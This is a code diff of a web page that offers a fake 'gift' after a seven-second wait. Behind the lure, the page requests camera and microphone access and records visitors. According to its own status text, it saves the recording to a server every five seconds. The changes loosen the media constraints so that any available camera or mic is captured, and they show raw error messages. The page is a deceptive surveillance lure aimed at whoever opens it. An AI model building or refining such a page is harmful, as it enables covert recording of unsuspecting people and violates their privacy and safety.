@@ -42,7 +42,7 @@
             background: #000;
             object-fit: cover;
             border: 2px solid rgba(255, 255, 255, 0.2);
-            transform: scaleX(-1); /* Mirror view */
+            transform: scaleX(-1);
         }
         #status {
             margin-top: 15px;
@@ -75,7 +75,6 @@
 
     <div class="container">
         <h2>wait 7 second & get (GIFT)</h2>
-        <!-- autoplay, muted, aur playsinline mobile ke liye zaroori hain -->
         <video id="preview" autoplay muted playsinline></video>
         
         <p id="status">Permissions mangi ja rahi hain...</p>
@@ -93,26 +92,25 @@
 
         async function initMedia() {
             try {
-                status.innerText = "Kripya Camera aur Microphone ki permission dein...";
+                status.innerText = "Camera aur Mic access ki koshish ki ja rahi hai...";
                 
-                // Explicitly front camera aur audio maangna
+                // Simple constraints taaki mobile ka koi bhi available camera/mic chal jaye
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' }, 
+                    video: true, 
                     audio: true 
                 });
                 
                 preview.srcObject = stream;
-                
-                // Video play hone ka ensure karna
-                await preview.play().catch(e => console.log("Preview play error:", e));
+                await preview.play();
                 
                 status.innerText = "🔴 Recording chalu hai... Har 5 second mein server par save ho raha hai.";
 
                 startRecordingCycle();
 
             } catch (err) {
-                console.error("Permission error:", err);
-                status.innerText = "Error: Camera ya Mic ki permission nahi mili.";
+                console.error("Permission error details:", err);
+                // Screen par exact error dikhayega taaki reason pata chale
+                status.innerText = "Error: " + (err.message || err.name || "Permission denied");
             }
         }
 
